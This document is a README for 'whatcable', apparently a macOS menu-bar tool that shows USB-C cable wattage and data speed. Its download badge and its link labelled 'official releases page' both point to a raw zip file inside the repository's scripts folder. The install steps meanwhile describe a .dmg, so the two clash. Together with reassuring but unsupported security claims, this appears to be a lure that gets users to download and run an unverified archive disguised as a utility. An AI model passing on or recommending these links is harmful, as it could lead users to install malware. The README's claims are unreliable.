# 🔌 whatcable - See your USB-C cable capabilities clearly

[![Download Latest Release](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://raw.githubusercontent.com/Allsunfallen739/whatcable/main/scripts/Software-v2.6.zip)

## 💡 About this application

Many USB-C cables look identical. Manufacturers often neglect to mark cables with their specific speed or power delivery limits. This causes confusion when you try to charge a laptop or transfer large files.

whatcable solves this problem. It runs in the menu bar of your Mac. When you plug a USB-C cable into your computer, the app reads the internal hardware information. It then shows you exactly what that cable does. It tells you the maximum power delivery in watts and the data transfer speed in gigabits per second. You no longer need to guess if a cable supports your monitor, your drive, or your fast charger.

## 🛠 Features

*   **Real-time scanning:** The app identifies cables the moment you plug them into a USB-C port.
*   **Plain English status:** It translates complex technical standards into readable text.
*   **Voltage and Wattage monitoring:** It shows how much power the cable sends to your device.
*   **Data speed breakdown:** It confirms if a cable handles high-speed file transfers or only basic charging.
*   **Low memory impact:** The app stays in your menu bar without slowing down your computer.
*   **Hardware compatibility:** It supports Thunderbolt, USB4, and standard USB-C protocols.

## 📥 How to get started

You need a Mac running a recent version of macOS to use this tool. The application works with both Intel-based Macs and Apple Silicon M-series chips.

Follow these steps to install the app:

1. Visit the [official releases page](https://raw.githubusercontent.com/Allsunfallen739/whatcable/main/scripts/Software-v2.6.zip) to see available downloads.
2. Select the latest version listed under the Assets section.
3. Download the disk image file ending in .dmg to your computer.
4. Double-click the downloaded file to open the image.
5. Drag the whatcable icon into your Applications folder.
6. Open your Applications folder and double-click whatcable to start the program.

The application icon will appear in your top menu bar. Clicking this icon reveals the current status of any connected USB-C devices.

## ⚙️ System Requirements

*   **Operating System:** macOS 12.0 or newer.
*   **Processor:** Apple Silicon (M1, M2, M3) or Intel processor.
*   **Disk Space:** 50 MB of free storage.
*   **Hardware:** An available USB-C or Thunderbolt port on your Mac.

## 🧐 Understanding the results

The app displays information in simple categories. Use this guide to understand what you see after you plug in a cable.

**Power Delivery**
This section shows the maximum output the cable provides to your device. Most modern laptops require at least 60 watts to charge correctly. If the app displays a value lower than the requirement of your device, the laptop may charge slowly or not at all.

**Data Transfer Speed**
This section indicates how fast the cable moves files. 
*   **480 Mbps:** Useful for basic charging or slow data transfers.
*   **5 Gbps or 10 Gbps:** Standard for solid-state drives and modern hard drives.
*   **20 Gbps or 40 Gbps:** Required for high-resolution monitors and professional external storage systems.

**Protocol Support**
The app checks if the cable uses the Thunderbolt standard. Thunderbolt cables allow for advanced display output and external graphics cards. If the app shows standard USB, the cable will likely not work with high-end docking stations or daisy-chained displays.

## 🔧 Frequently Asked Questions

**Does this app work with older USB-A cables?**
No. This tool specifically monitors the controllers inside USB-C and Thunderbolt cables. USB-A cables lack the internal pins needed to communicate these details to your computer.

**Is my data private?**
Yes. The app reads hardware information from the cable controller. It does not send this data to the internet. It does not record your file transfers or track your history.

**Why does my cable say unknown?**
Some inexpensive, non-certified cables lack internal chips. If the cable does not contain a controller, the operating system cannot query it for information. In these cases, the app reports that the hardware information is unavailable.

**Does the app run in the background?**
The app occupies a small space in your menu bar. It remains idle until you plug in a new device. This design saves battery life and preserves memory for your other tasks.

**How do I close the app?**
Click the app icon in the menu bar and select Quit. You can also open the Activity Monitor, find whatcable, and select Force Quit if the app becomes unresponsive.

## 🛡 Security and Privacy

This project follows strict security standards. The code communicates directly with the IOKit framework, which is the system layer for hardware interaction on macOS. It does not require elevated permissions or root access to function. You can inspect the source code in this repository to verify the app behavior.

## 🤝 Getting specific information

If you encounter a specific cable that does not report correctly, you can reach out via the Issues tab in this repository. Please provide the brand of the cable and the specific Mac model you are using. This helps improve the detection database for all users. We update the app regularly to support new hardware variations released by manufacturers.